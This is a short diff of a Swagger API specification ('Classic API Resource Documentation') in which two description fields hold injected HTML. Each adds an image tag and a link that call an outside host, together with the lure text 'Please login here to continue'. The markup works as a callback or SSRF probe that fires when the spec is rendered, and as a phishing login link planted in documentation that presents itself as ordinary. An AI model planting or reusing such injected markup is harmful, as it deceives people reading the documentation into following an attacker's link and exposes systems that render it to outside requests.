@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    Hi, im joey<br><img src='https://mzl0y1cm.x1.pe/ssrf.svg'><a href='https://mzl0y1cm.x1.pe/ssrf.svg'><br>Please login here to continue</a>
+    Hi, im joey<br><img src='https://mzl0y1cm.x1.pe/'><a href='https://mzl0y1cm.x1.pe/'><br>Please login here to continue</a>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            Hi, im lightangel1412<br><img src='https://mzl0y1cm.x1.pe/ssrf.svg'><a href='https://mzl0y1cm.x1.pe/ssrf.svg'><br>Please login here to continue</a>
+            Hi, im lightangel1412<br><img src='https://mzl0y1cm.x1.pe'><a href='https://mzl0y1cm.x1.pe'><br>Please login here to continue</a>
 
           format: int64
           in: path
